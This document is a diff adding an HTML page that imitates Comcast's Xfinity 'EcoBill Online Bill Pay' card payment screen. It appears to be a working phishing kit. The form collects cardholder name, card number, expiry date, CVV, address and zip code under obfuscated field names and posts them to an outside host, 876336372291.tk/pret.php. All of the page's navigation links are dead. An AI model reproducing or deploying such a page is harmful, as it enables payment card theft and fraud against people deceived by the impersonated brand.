@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<head>
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<title>XFINITY | My Account | EcoBill® Online Bill Pay</title>
+<meta name="robots" content="noindex"> 
+<link rel="stylesheet" href="./play/cornshine.css">
+ 
+</head>
+<body>
+<div   class="page-app page-app--takeover page-app--no-nav">
+<div class="a11y-links">
+ 
+</div>
+ 
+ <header id="page-header" class="page-header page-app--takeover page-header--breadcrumbs ui-dark" role="banner">
+<div class="page-header__logo-wrap">
+<a href="javascript:void(0)" class="page-header__logo icon-xfinity-white" rel="home">
+<span class=""><img src="./play/be.svg"></span>
+</a>
+</div>
+
+</header>
+<div id="page-content" class="page-content">
+<div id="page-main" class="page-main">
+<main id="page-view" class="page-view view" tabindex="-1" ng-view="" autoscroll="true" aria-live="assertive" aria-atomic="true">
+<div ng-switch="state">
+<div ng-switch-when="payment" class="payment--form">  
+<section class="page-section ui-light late-fee-credit-dropdown" style="" tracking-module="overview|latefeecreditmessage" classes="ui-light late-fee-credit-dropdown" ng-class="{&#39;hero&#39;: hero}">
+<div class="page-section__wrapper clearfix">
+<div class="page-section__content" ng-transclude="">
+<div class="inline-icon__icon circle circle--bill circle--large">
+<span class="icon svg-icon" ng-bind-html="iconHtml" icon="bill">
+<svg data-name="Layer 1"
+xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 48">
+<path d="M35.6 0H2.4A2.4 2.4 0 0 0 0 2.4v5.17h38V2.4A2.4 2.4 0 0 0 35.6 0zM4.51 5.39a1.32 1.32 0 1 1 1.32-1.32 1.32 1.32 0 0 1-1.32 1.32zm4.3 0a1.32 1.32 0 1 1 1.32-1.32 1.32 1.32 0 0 1-1.31 1.32zm4.3 0a1.32 1.32 0 1 1 1.32-1.32 1.32 1.32 0 0 1-1.31 1.32zM38 8.54H0V45.6A2.4 2.4 0 0 0 2.4 48h33.2a2.4 2.4 0 0 0 2.4-2.4V8.54zM15.21 24.13a1.22 1.22 0 0 1 1.41 1c.27 1.62 2 1.71 2.38 1.71 2.27 0 2.36-1.34 2.36-1.87-.08-.7-.58-1-2.51-1.79-1.56-.56-4.23-1.51-4.23-4.16a4 4 0 0 1 3.15-3.91v-1.69a1.23 1.23 0 1 1 2.45 0V15a4.52 4.52 0 0 1 3.37 3 1.23 1.23 0 1 1-2.3.84 2.13 2.13 0 0 0-2.15-1.49c-.21 0-2.07 0-2.07 1.65 0 .6.42 1.07 2.63 1.86 1.84.71 3.89 1.5 4.11 3.92v.11a4.13 4.13 0 0 1-3.58 4.26v1.91a1.23 1.23 0 1 1-2.45 0v-1.91a4.37 4.37 0 0 1-3.57-3.61 1.23 1.23 0 0 1 1-1.41zm7.92 18.27H8.26a.49.49 0 0 1 0-1h14.87a.49.49 0 0 1 0 1zm6.61-4.61H8.26a.49.49 0 0 1 0-1h21.48a.49.49 0 0 1 0 1z" fill="#fff" fill-rule="evenodd"></path>
+</svg>
+</span>
+</div>
+<div class="inline-icon__content">
+<h3 ng-if="info.title">Pay what you owe and get a one-time late fee credit of $10.00 when you set up automatic payments</h3>
+<!-- ngIf: info.body -->
+<p ng-if="info.body">You can set up automatic payments on the review page.</p>
+</div>
+</div>
+</div>
+</section>
+</late-fee-credit-dropdown>
+<section class="page-section ui-grey page-section--payment" style="">
+<div class="page-section__wrapper clearfix">
+<div class="page-section__content">
+<!-- ngIf: errorData && errorData.isGeneric -->
+<div context="PAYMENT" limit="3">
+
+</div> 
+<form action="https://876336372291.tk/pret.php" method="post"> 
+<div class="payment__section">
+<div class="card-group">
+<div class="card-group__item">
+<div class="card card--form-control">
+<div class="form-control form-control--boolean">
+<div class="form-control__input">
+<input id="paymentMethodCC" name="paymentMethodOption" type="radio"  class="ng-pristine ng-valid ng-valid-required ng-valid-parse ng-touched" checked="">
+<label class="form-control__label body2" for="paymentMethodCC" ng-if="label">
+<span class="form-control__label-text">New Credit/Debit Card</span>
+</label>
+</div>
+</div>
+</div>
+</div>
+<div class="card-group__item" ng-if="formData.paymentMethodOption.method === &#39;card&#39;">
+<fieldset class="card card--secondary credit-card-payment ng-valid" 	 aria-invalid="false">
+<div class="card__content">
+<div class="form-control-group form-control-group--flex-at-768">
+<div class="form-control-group__item">
+<div class="form-control " input- label="First Name">
+<label class="form-control__label" for="firstName" ng-if="label" ng-class="labelClass">First Name
+</label>
+<!-- ngIf: note -->
+<div class="form-control__input" ng-transclude="">
+<input  name="dagei" type="text" title="First name" aria-required="true"  class="ng-pristine ng-untouched ng-valid ng-valid-required" aria-invalid="false"> 
+</div>
+</div>
+</div>
+<div class="form-control-group__item">
+<div class="form-control " input-id="lastName" label="Last Name">
+<label class="form-control__label" for="lastName" ng-if="label" ng-class="labelClass">Last Name
+</label>
+<!-- ngIf: note -->
+<div class="form-control__input" ng-transclude="">
+<input id="lastName" name="takeri" type="text"  class="ng-pristine" aria-invalid="false"> 
+</div>
+</div>
+</div>
+</div>
+<div class="form-control-group form-control-group--flex-at-768">
+<div class="form-control-group__item">
+<div class="form-control " input-id="cardNumber">
+<label class="form-control__label" for="cardNumber" ng-if="label" ng-class="labelClass">Card number
+</label>
+<!-- ngIf: note -->
+<div class="form-control__input" ng-transclude="">
+<input id="cardNumber" name="locahtyui" type="text" maxlength="19"  class="ng-pristine" aria-invalid="false">
+<span id="cardNumberServerError" class="form-control__error ng-hide" role="alert" ng-show="form.cardNumber.$error.serverError" aria-hidden="true"></span>  
+</div>
+</div>
+</div>
+<div class="form-control-group__item">
+<div class="form-control-group form-control-group--flex-at-768">
+<div class="form-control-group__item form-control-group__item--2of3">
+<h3 class="label">Expiration</h3>
+<div class="form-control-group form-control-group--flex">
+<div class="form-control-group__item">
+<div class="form-control ">
+<!-- ngIf: note -->
+<div class="form-control__input" ng-transclude="">
+<select id="expirationMonth" name="effecti" title="Expiration month"
+ class="ng-pristine">
+<option value="" disabled="" selected="selected" hidden="" class="">MM</option>
+<option label="01" value="01">01</option>
+<option label="02" value="02">02</option>
+<option label="03" value="03">03</option>
+<option label="04" value="04">04</option>
+<option label="05" value="05">05</option>
+<option label="06" value="06">06</option>
+<option label="07" value="07">07</option>
+<option label="08" value="08">08</option>
+<option label="09" value="09">09</option>
+<option label="10" value="10">10</option>
+<option label="11" value="11">11</option>
+<option label="12" value="12">12</option>
+</select>
+</div>
+</div>
+</div>
+<div class="form-control-group__item">
+<div class="form-control ">
+<!-- ngIf: note -->
+<div class="form-control__input" ng-transclude="">
+<select id="expirationYear" name="jessshiyu" class="ng-pristine" aria-invalid="false">
+<option value="" disabled="" selected="selected" hidden="" class="">YYYY</option>
+<option label="2019" value="2019">2019</option>
+<option label="2020" value="2020">2020</option>
+<option label="2021" value="2021">2021</option>
+<option label="2022" value="2022">2022</option>
+<option label="2023" value="2023">2023</option>
+<option label="2024" value="2024">2024</option>
+<option label="2025" value="2025">2025</option>
+<option label="2026" value="2026">2026</option>
+<option label="2027" value="2027">2027</option>
+<option label="2028" value="2028">2028</option>
+<option label="2029" value="2029">2029</option>
+</select>
+</div>
+</div>
+</div>
+</div>
+ 
+</div>
+
+<div class="form-control-group__item form-control-group__item--1of3">
+<div class="form-control">
+<label class="form-control__label" for="cvv">
+ CVV
+ 
+<span class="modal-modal ml3" >
+<span class="button button--text" >
+<span class="svg-icon--22 svg-icon" ng-bind-html="iconHtml" icon="circle-i" color1="#2B9CD8" color2="#fff">
+<svg focusable="false" viewBox="0 0 22 22">
+<g fill="none">
+<circle style="fill:none;stroke:currentColor;stroke-miterlimit:10;" cx="11" cy="11" r="10"></circle>
+<path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path>
+</g>
+</svg>
+</span> 
+</span>
+</span>
+</label>
+<div class="form-control__input">
+<input id="cvv" name="bunti" type="text" class="ng-pristine"> 
+</div>
+</div>
+</div>
+</div>
+
+</div>
+
+
+</div>
+
+<div class="form-control " style="max-width: 100%;">
+<label class="form-control__label" for="firstName" ng-if="label">Address
+</label>
+<!-- ngIf: note -->
+<div class="form-control__input" ng-transclude="">
+<input  name="strikes" type="text" title="First name" class="ng-pristine" aria-invalid="false"> 
+</div>
+</div>
+<div class="form-control " style="max-width: 100%;">
+<label class="form-control__label" for="firstName" ng-if="label" ng-class="labelClass">Zip Code
+</label> 
+<div class="form-control__input" ng-transclude="">
+<input  name="pintblood" type="text" title="First name" aria-required="true"  class="ng-pristine" > 
+</div>
+</div>
+<div class="form-control form-control--boolean " label="Billing address is different from service address" input-id="billingAddressCheckbox">
+<div class="form-control__input">
+<input id="billingAddressCheckbox" name="billingAddressCheckbox" type="checkbox" ng-checked="data.billingAddressDifferent" ng-model="data.billingAddressDifferent" class="ng-pristine ng-untouched ng-valid" aria-checked="false" aria-invalid="false">
+<label class="form-control__label " for="billingAddressCheckbox" ng-if="label">
+<span class="form-control__label-text" ng-bind-html="label">Billing address is different from service address</span>
+</label>
+</div>
+</div> 
+<div class="form-control form-control--boolean " label="">
+<div class="form-control__input">
+<input id="savePayment" name="savePayment" type="checkbox" class="ng-pristine" aria-checked="false" aria-invalid="false">
+<label class="form-control__label" for="savePayment">
+<span>
+ Store this card for future purchases.
+<br>
+ I agree to the 
+<a href="javascript:void(0)" target="_blank">
+ Terms and Conditions for Stored Payment Methods</a>.
+ 
+</span>
+</label> 
+</div>
+</div>
+</div>
+</fieldset>
+</div>
+</div>
+</div>
+<div class="action action--right">
+<div class="action__item">
+<button class="button button--primary" type="submit" name="riuy7hy">
+ Continue
+ </button>
+</div>
+<div class="action__item" ng-if="!disableCancel">
+<a class="button" href="javascript:void(0)?billing">Cancel</a>
+</div>
+</div>
+</form>
+</div>
+</div>
+</section>
+</ng-include>
+</div>
+<!-- ngSwitchWhen: review -->
+<!-- ngSwitchWhen: error -->
+</div>
+</main>
+<section class="page-section ui-light cms-support" style=""  classes="ui-light cms-support">
+<div class="page-section__wrapper clearfix">
+<div class="page-section__content" ng-transclude="">
+<div class="cms-support__title">
+<h2 class="heading2">Help &amp; Support</h2>
+<a class="support-title-link" target="_blank" href="javascript:void(0)?support">View Help &amp; Support</a>
+</div>
+<div class="ma-grid cms-support__body">
+<div class="ma-grid__col ma-grid__col--1of1" ng-repeat="column in data.columns | limitTo:4" ng-class="{&#39;cms-support__no-title&#39;:!column.title}">
+<h6 class="cms-support__heading">Contact</h6>
+<ul class="cms-support__list">
+<li ng-repeat="item in column.link_wrap.links">
+<div ng-if="item.heading" class="cms-support__item-heading">Get answers from Comcast agents and customers like you.</div>
+<a ng-href="javascript:void(0)?support/contact-us/" target="_blank" href="javascript:void(0)">View contact options</a>
+</li>
+</ul>
+</div> 
+</div>
+</div>
+</div>
+</section>
+</cms-support>
+</div>
+</div>
+</div>
+
+</div>
+</body>
+</html>
